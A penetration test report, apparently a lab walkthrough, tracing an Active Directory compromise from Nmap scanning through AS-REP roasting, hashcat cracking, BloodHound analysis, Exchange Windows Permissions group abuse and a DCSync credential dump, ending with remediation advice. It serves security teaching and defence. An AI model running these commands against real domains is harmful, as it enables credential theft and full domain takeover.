# Active Directory Penetration Test Report

---

## Table of Contents

1. [Target Discovery](#1-target-discovery)
2. [Service Analysis](#2-service-analysis)
3. [Host Identification](#3-host-identification)
4. [Security Observations](#4-security-observations)
5. [Domain User Enumeration](#5-domain-user-enumeration)
6. [Kerberos AS-REP Roasting](#6-kerberos-as-rep-roasting)
7. [Offline Password Cracking](#7-offline-password-cracking)
8. [Active Directory Enumeration (BloodHound)](#8-active-directory-enumeration-bloodhound)
9. [Privilege Escalation via Delegated Administrative Permissions](#9-privilege-escalation-via-delegated-administrative-permissions)
10. [Account Creation via Delegated Administrative Privileges](#10-account-creation-via-delegated-administrative-privileges)
11. [Exchange Administrative Group Abuse](#11-exchange-administrative-group-abuse)
12. [Granting Replication Privileges](#12-granting-replication-privileges)
13. [Domain Compromise via DCSync](#13-domain-compromise-via-dcsync)
14. [Security Impact](#14-security-impact)
15. [Root Cause](#15-root-cause)
16. [Remediation Recommendations](#16-remediation-recommendations)

---

## 1. Target Discovery

Initial reconnaissance was performed to identify exposed services on the target host. Network enumeration was conducted using **Nmap** to determine the attack surface and identify services associated with Active Directory infrastructure.

### Command Executed

```bash
nmap -sC -sV -T4 <target-ip> -oA nmap_initial
```

### Scan Results

```text
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds Windows Server 2016 Standard microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
```

---

## 2. Service Analysis

The scan revealed multiple services commonly associated with a **Microsoft Active Directory Domain Controller**.

| Port | Service | Description |
|------|---------|-------------|
| 53 | DNS | Domain Name System used for Active Directory service discovery |
| 88 | Kerberos | Primary authentication protocol used by Active Directory |
| 135 | MSRPC | Windows Remote Procedure Call service |
| 139 | NetBIOS | Legacy SMB communication |
| 389 | LDAP | Active Directory directory service used for authentication and object queries |
| 445 | SMB | Windows file sharing and remote administration |
| 464 | Kerberos Password Change | Kerberos password management service |
| 593 | RPC over HTTP | Remote procedure calls over HTTP |
| 636 | LDAPS | Secure LDAP service |
| 3268 | Global Catalog | Forest-wide Active Directory search service |
| 3269 | Global Catalog over SSL | Encrypted global catalog access |

---

## 3. Host Identification

Additional enumeration revealed key information about the target system:

| Attribute | Value |
|-----------|-------|
| Operating System | Windows Server 2016 |
| Hostname | `<redacted>` |
| Domain | `<redacted>` |
| Fully Qualified Domain Name | `<redacted>` |

The presence of **Kerberos (88/tcp)**, **LDAP (389/tcp)**, **SMB (445/tcp)**, and the **Global Catalog service (3268/tcp)** strongly indicates that the target host is operating as a **Domain Controller within an Active Directory environment**.

---

## 4. Security Observations

SMB enumeration revealed that **message signing is enabled and required**, which prevents certain relay attacks such as classic NTLM relay against SMB services.

However, the exposed **Kerberos and LDAP services** present potential attack vectors including:

- Kerberos user enumeration
- AS-REP roasting
- LDAP enumeration
- Active Directory privilege escalation paths

These services significantly expand the attack surface and were investigated further in subsequent enumeration phases.

---

## 5. Domain User Enumeration

After identifying the target host as an Active Directory Domain Controller, the next objective was to enumerate valid domain users. Valid usernames significantly increase the effectiveness of password attacks and Kerberos-based credential harvesting techniques.

### User Enumeration via LDAP

Unauthenticated LDAP queries were used to enumerate domain users.

#### Command Executed

```bash
nxc ldap <target-ip> --users
```

#### Discovered Users

```text
user1
user2
user
user4
user5
svc-user
```

The discovered usernames were saved into a wordlist (`users.txt`) for further authentication testing.

---

## 6. Kerberos AS-REP Roasting

Kerberos accounts with the attribute **UF_DONT_REQUIRE_PREAUTH** enabled allow attackers to request authentication responses without providing valid credentials. This enables **AS-REP roasting**, where encrypted authentication material can be obtained and cracked offline.

### Initial Check

```bash
nxc ldap <target-ip> --no-preauth-targets users.txt
```

The initial scan did not return any vulnerable accounts:

```text
[*] No users with UF_DONT_REQUIRE_PREAUTH identified
```

### Verification with GetNPUsers

To confirm the results, Kerberos authentication requests were performed directly using Impacket's **GetNPUsers**.

#### Command Executed

```bash
GetNPUsers.py <redacted-domain>/ -usersfile users.txt -dc-ip <target-ip> -no-pass
```

#### Result

While most accounts required pre-authentication, the service account **svc-alfresco** was identified as vulnerable.

```text
[-] User <user1> doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User <user2> doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User <user3> doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User <user4> doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User <user5> doesn't have UF_DONT_REQUIRE_PREAUTH set
```

#### Captured AS-REP Hash

```text
$krb5asrep$23$svc-<redacted>:0bc62f49bf3a967469687aea530f2d59$183580b8d285f569f49be3de3770c7f59c9029f8b19392a5844<redacted>916e4a1f
```

---

## 7. Offline Password Cracking

The captured AS-REP hash was subjected to offline password cracking using `hashcat`.

### Command Executed

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

### Result

```text
svc-<redacted> : <redacted>
```

### Analysis

This confirms that the Kerberos pre-authentication misconfiguration combined with a weak password allowed the attacker to obtain valid domain credentials without any prior authenticated access.

### Remediation

- Ensure **Kerberos pre-authentication is enabled** for all accounts unless explicitly required
- Enforce **strong password policies** for service accounts (long, random passwords)
- Where possible, use **gMSA/MSA** to eliminate static service account passwords
- Monitor for suspicious Kerberos activity consistent with AS-REP roasting (multiple AS-REQ requests for different users)

---

## 8. Active Directory Enumeration (BloodHound)

With valid domain credentials obtained, further enumeration of the Active Directory environment was performed using **BloodHound** to identify privilege relationships, delegated rights, and potential attack paths.

### Command Executed

```bash
bloodhound-python -d <redacted-domain> -u <redacted-user> -p '<redacted-password>' \
  -dc <redacted-domain-controller> -ns <redacted-ip> -c All
```

### Enumeration Results

```text
Found AD domain: <redacted-domain>
Found 2  computers
Found 32 users
Found 76 groups
Found 2  GPOs
Found 15 OUs
Found 20 containers
Found 0  trusts
```

### Data Analysis

The collected data was imported into the **BloodHound GUI** to analyze privilege relationships. Using the **"Shortest Paths to Domain Admins"** query revealed a privilege escalation path originating from the compromised service account, identifying privileged groups and delegated rights that could be abused to escalate domain privileges.

---

## 9. Privilege Escalation via Delegated Administrative Permissions

Analysis of the BloodHound graph revealed that the compromised account was a member of a delegated administrative group with elevated account management privileges. This group had the ability to modify membership of an Exchange administrative group, which in turn possessed delegated permissions over the domain object — specifically the ability to modify ACLs.

This delegation chain enabled an attacker to grant themselves directory replication permissions and perform a **DCSync attack** against the domain controller.

The path highlighted the **Exchange Windows Permissions** group as the critical escalation point. This group possesses delegated permissions capable of modifying the **Active Directory domain object's ACL**. Gaining membership in this group allows an attacker to assign **directory replication privileges**, ultimately enabling full domain compromise.

### Impact

- Grant replication privileges to an attacker-controlled account
- Execute a DCSync operation against the domain controller
- Extract password hashes for all domain users
- Achieve full Active Directory domain compromise

---

## 10. Account Creation via Delegated Administrative Privileges

Membership within delegated administrative groups granted the compromised service account the ability to manage domain user accounts, allowing attackers to create new identities for persistence or further escalation.

### Command Executed

```bash
bloodyAD --host <target-ip> \
  -d '<redacted-domain>' \
  -u '<redacted-user>' \
  -p '<redacted-password>' \
  add user '<redacted-user>' '<redacted-password>'
```

### Result

```text
[+] <redacted-user> created
```

### Analysis

The successful account creation confirms delegated administrative privileges. Attackers create new accounts in order to:

- Maintain persistence within the domain
- Avoid reliance on the initially compromised account
- Establish attacker-controlled identities
- Facilitate further privilege escalation

---

## 11. Exchange Administrative Group Abuse

### Identifying the Target Group

The distinguished name of the Exchange administrative group was retrieved to confirm the correct Active Directory object path.

#### Command Executed

```bash
bloodyAD --host <target-ip> \
  -d '<redacted-domain>' \
  -u '<redacted-user>' \
  -p '<redacted-password>' \
  get object 'Exchange Windows Permissions' --attr distinguishedName
```

#### Result

```text
distinguishedName: CN=Exchange Windows Permissions,
                   OU=Microsoft Exchange Security Groups,
                   DC=<redacted>,DC=<redacted>
```

---

### Modifying Group Membership

After identifying the correct group, the attacker-controlled account was added to the **Exchange Windows Permissions** group.

#### Command Executed

```bash
bloodyAD --host <target-ip> \
  -d '<redacted-domain>' \
  -u '<redacted-user>' \
  -p '<redacted-password>' \
  add groupMember 'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=<redacted>,DC=<redacted>' '<redacted-user>'
```

#### Result

```text
[+] <redacted-user> added to CN=Exchange Windows Permissions
```

#### Analysis

Membership in the **Exchange Windows Permissions** group grants delegated privileges capable of modifying the domain object's ACL, allowing attackers to grant replication privileges that are normally restricted to domain controllers.

---

## 12. Granting Replication Privileges

After gaining membership in the Exchange administrative group, the domain object's ACL was modified to grant directory replication privileges to the attacker-controlled account.

### Commands Executed

```powershell
$pass = ConvertTo-SecureString '<redacted-password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<domain>\<redacted-user>', $pass)

Add-ObjectACL -PrincipalIdentity <redacted-user> -Credential $cred -Rights DCSync
```

### Analysis

The `Add-ObjectACL` function assigns the following permissions:

| Permission | Description |
|------------|-------------|
| `Replicating Directory Changes` | Allows replication of directory data |
| `Replicating Directory Changes All` | Allows replication of all directory data, including secrets |

---

## 13. Domain Compromise via DCSync

With replication privileges assigned, a directory replication request was performed against the domain controller. This technique — **DCSync** — mimics the behavior of a legitimate domain controller requesting replication updates.

### Command Executed

```bash
secretsdump <redacted-domain>/<redacted-user>@<target-ip>
```

### Result

```text
[*] Dumping Domain Credentials

<redacted-domain>\Administrator:500:<redacted>:<redacted>
<redacted-domain>\krbtgt:502:<redacted>:<redacted>
<...SNIP...>
```

The replication request successfully retrieved credential material for all domain accounts, including **Administrator** and **KRBTGT**.

---

## 14. Security Impact

Successful execution of the DCSync attack results in **full Active Directory domain compromise**. This level of access enables an attacker to:

- Extract password hashes for all domain users
- Impersonate any domain account (Pass-the-Hash, Golden Ticket)
- Access all domain-joined systems
- Establish persistent administrative control
- Deploy ransomware or destructive payloads across the environment

> ⚠️ **Active Directory compromise represents one of the most severe security incidents within an enterprise network.**

---

## 15. Root Cause

| Root Cause | Description |
|------------|-------------|
| Excessive delegated administrative privileges | Service accounts granted more permissions than necessary |
| Misconfigured Active Directory ACLs | Sensitive domain objects modifiable by non-admin accounts |
| Over-privileged Exchange administrative groups | Exchange groups granted domain-level write permissions |
| Weak service account security | Initial foothold gained via compromised service account |

---

## 16. Remediation Recommendations

### Enforce Least Privilege
Administrative groups should follow the **principle of least privilege**, ensuring only necessary permissions are assigned to each account and group.

### Review Delegated Administrative Groups
Groups such as **Account Operators** and **Exchange Windows Permissions** should be audited to ensure they do not grant unnecessary or excessive domain privileges.

### Harden Active Directory ACLs
Access control lists on sensitive Active Directory objects (particularly the domain object itself) should be reviewed regularly to ensure only authorized administrators can modify them.

### Monitor Directory Replication Activity
Security monitoring solutions should alert on directory replication requests originating from **non-domain controller accounts**, which may indicate a DCSync attack in progress.

### Enable Kerberos Pre-Authentication
Ensure **UF_DONT_REQUIRE_PREAUTH** is not set on any account unless explicitly required, and enforce strong password policies for all service accounts.
